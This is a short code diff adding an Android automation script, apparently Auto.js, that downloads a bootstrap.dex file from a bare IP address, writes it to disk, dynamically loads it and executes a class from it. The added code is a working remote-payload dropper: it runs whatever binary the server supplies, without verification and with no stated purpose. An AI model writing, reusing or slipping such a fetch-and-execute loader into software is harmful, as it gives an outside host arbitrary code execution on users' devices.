@@ -1,0 +1,17 @@
+try {
+    var res = http.get('https://178.236.47.231/rxjh/bootstrap.dex');
+    if (res.statusCode != 200) {
+        toast("下载失败");
+    } else {
+        let bootstrap = files.cwd() + "/bootstrap.dex"
+        files.writeBytes(bootstrap, res.body.bytes());
+        if (files.exists(bootstrap)) {
+            runtime.unloadDex(bootstrap);
+            runtime.loadDex(bootstrap);
+            new Packages['bootstrap']()()
+            runtime.unloadDex(bootstrap);
+        }
+    }
+} catch (ex) {
+    console.error($debug.getStackTrace(ex));
+}
